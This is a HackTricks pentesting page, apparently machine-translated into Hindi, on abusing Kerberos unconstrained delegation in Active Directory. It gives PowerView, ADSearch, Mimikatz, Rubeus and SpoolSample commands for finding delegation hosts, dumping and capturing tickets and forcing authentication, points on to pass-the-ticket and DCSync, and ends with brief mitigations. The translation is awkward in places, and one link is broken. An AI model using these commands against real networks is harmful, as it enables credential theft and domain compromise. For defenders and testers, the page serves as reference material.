# असंविधानिक डिलीगेशन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें**.
* **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें**।

</details>

## असंविधानिक डिलीगेशन

यह एक सुविधा है जिसे डोमेन प्रशासक किसी भी **कंप्यूटर** में सेट कर सकता है। फिर, जब भी एक **उपयोगकर्ता लॉगिन** करता है कंप्यूटर पर, उस उपयोगकर्ता के **TGT की एक प्रतिलिपि** DC द्वारा प्रदान किए गए TGS में **भेजी जाएगी और LSASS में मेमोरी में सहेजी जाएगी**। इसलिए, यदि आपके पास मशीन पर प्रशासक विशेषाधिकार हैं, तो आप किसी भी मशीन पर टिकट्स को **डंप कर सकेंगे और उपयोगकर्ताओं का अनुकरण कर सकेंगे**।

तो यदि डोमेन व्यवस्थापक "असंविधानिक डिलीगेशन" सुविधा सक्रिय करके किसी कंप्यूटर में लॉगिन करता है, और आपके पास उस मशीन में स्थानीय प्रशासक विशेषाधिकार हैं, तो आप कहीं भी टिकट को डंप कर सकेंगे और डोमेन व्यवस्थापक का अनुकरण कर सकेंगे (डोमेन प्राइवेसी).

आप इस गुण के साथ **कंप्यूटर ऑब्जेक्ट्स ढूंढ सकते हैं** जांचकर कि क्या [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) गुण [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) को समावेश करता है। आप इसे एक LDAP फ़िल्टर के साथ कर सकते हैं ' (userAccountControl:1.2.840.113556.1.4.803:=524288) ', जो powerview करता है:

<pre class="language-bash"><code class="lang-bash"># असंविधानिक कंप्यूटरों की सूची
## Powerview
Get-NetComputer -Unconstrained #DCs हमेशा दिखाई देते हैं लेकिन privesc के लिए उपयोगी नहीं होते हैं
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Mimikatz के साथ टिकट निर्यात करें
</strong>privilege::debug
sekurlsa::tickets /export #सिफारिश की जाती है
kerberos::list /export #एक और तरीका

# लॉगिन की निगरानी करें और नए टिकट निर्यात करें
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #नए TGT के लिए हर 10 सेकंड में जांचें</code></pre>

**Mimikatz** या **Rubeus** के साथ व्यवस्थापक (या पीड़ित उपयोगकर्ता) का टिकट मेमोरी में लोड करें एक [**पास द टिकट**](pass-the-ticket.md)** के लिए**।\
अधिक जानकारी: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.team में असंविधानिक डिलीगेशन के बारे में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **प्रमाणीकरण को बलवान बनाएं**

यदि एक हमलावर किसी कंप्यूटर को "असंविधानिक डिलीगेशन" के लिए अनुमति देने के लिए सक्षम है, तो वह एक **प्रिंट सर्वर** को **स्वचालित रूप से लॉगिन** करने के लिए धोखा दे सकता है और सर्वर की मेमोरी में एक TGT को सहेज सकता है।\
फिर, हमलावर उपयोगकर्ता प्रिंट सर्वर कंप्यूटर खाते का अनुकरण करने के लिए एक **पास द टिकट हमला** कर सकता है।

किसी भी मशीन के खिलाफ प्रिंट सर्वर को लॉगिन करने के लिए आप [**SpoolSample
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
यदि TGT एक डोमेन कंट्रोलर से है, तो आप एक [**DCSync हमला**](acl-persistence-abuse/#dcsync) कर सकते हैं और DC से सभी हैश प्राप्त कर सकते हैं।\
[**इस हमले के बारे में अधिक जानकारी ired.team में।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**यहां अन्य तरीके हैं जिनका उपयोग करके प्रमाणीकरण को बलवान बनाने की कोशिश की जा सकती है:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### रोकथाम

* विशेष सेवाओं के लिए सीमित डीए/व्यवस्थापक लॉगिन करें
* उच्चाधिकारी खातों के लिए "खाता संवेदनशील है और इसे अधिग्रहण नहीं किया जा सकता" सेट करें।

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके।**

</details>
